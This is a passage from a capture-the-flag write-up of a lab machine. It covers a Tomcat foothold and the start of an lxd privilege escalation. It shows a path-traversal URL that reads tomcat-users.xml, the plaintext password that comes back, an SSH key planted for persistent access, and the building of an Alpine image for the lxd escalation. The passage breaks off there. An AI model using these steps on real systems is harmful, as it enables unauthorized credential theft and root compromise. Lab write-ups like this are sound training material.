Foothold

Opening 8080 revealed additional information. It says 'The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.'

We may be able to get tomcat admin credential if we could find this file.

Because we know there is LFI vulnerability, we can read the tomcat-users.txt.

However, the page doesn't return texts of the config file. The file path may not accurate.

According to this page, the /usr/share/tomcat9 is the path tomcat is instaled. However, we don't know where the tomcat-users/txt stored. Therefore, we need further research.

Using google research option, the keyword intext:/usr/share/tomcat9 intext:tomcat-users.xml intitle:debian returned this page. It was really frustrating time.

According to this page, the path /usr/share/tomcat9/etc/tomcat-users.xml may includes the credentials. Let's see.

Pressing the ctrl+U on the url http://megahosting.htb/news.php?file=/../../../../../usr/share/tomcat9/etc/tomcat-users.xml finally returned file tomcat-users.xml.

We got plaintext password $3cureP4s5w0rd123! and username tomcat.

Then, we've obtained tomcat credential. Next step is enumerating the 8080 directories and find the way to get reverse shell.

PrivEsc

Before move on, let's change this connection into ssh.

└─$ ssh-keygen
...
└─$ cd ~/.ssh
└─$ cat ******.pub

Copy the output, and paste to target's ~/.ssh/authorized_keys. Because there is no .ssh dir on the target machine, we can create it.

ash@tabby:~$ mkdir .ssh
ash@tabby:~$ cd .ssh
ash@tabby:~$ echo 'output' > authorized_keys

We can then connect to the target machine with ssh.

└─$ ssh -i ~/.ssh/**_******* ash@megahosting.htb #Use rsa file not public one(****.pub file)
...
ash@tabby:~$ ls

※Big Notion : You might not be able to use command for PrivEsc without ssh connection.

While enumerating user info, I found a famous privilege escalation vector.

ash@tabby:/var/www/html/files$ groups
ash adm cdrom dip plugdev lxd

This lxd is container tool. It can be used to run isolated Linux distributions, for development and testing environments, and for deploying containerized applications.

This means, we can take snapshot of root directory and ses arbitrary file with root privilege in the container.

I found great article, so I will follow this instruction.

First, I download lxd-alpine-builder from .git and build it on my own machine.

└─$ git clone https://github.com/saghul/lxd-alpine-builder
└─$ cd lxd-alpine-builder/
└─$ sudo ./build-alpine
└─$ mv alpine-v3.13-x86_64-20210218_0139.tar.gz alpine.tar.gz #For usability, I renamed generated gz file. It's discretionary.

Then, upload generated file to target machine.
